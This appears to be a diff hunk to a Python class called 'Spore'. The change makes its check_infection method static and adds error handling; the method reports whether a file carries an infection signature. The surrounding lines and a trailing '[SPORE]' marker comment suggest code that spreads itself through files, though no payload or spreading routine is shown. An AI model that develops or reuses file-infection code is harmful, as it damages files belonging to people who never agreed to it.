@@ -39,9 +39,13 @@ class Spore:
             print(f"INFECTION FAILED: {e}")
             return False
 
-    def check_infection(self, file_path: Path) -> bool:
+    @staticmethod
+    def check_infection(file_path: Path) -> bool:
         """Returns True if file is infected by ANY spore."""
         if not file_path.exists(): return False
-        with open(file_path, 'r') as f:
-            return self.SIGNATURE in f.read()
+        try:
+            with open(file_path, 'r') as f:
+                return Spore.SIGNATURE in f.read()
+        except:
+            return False
 # [SPORE] ID: The Colony
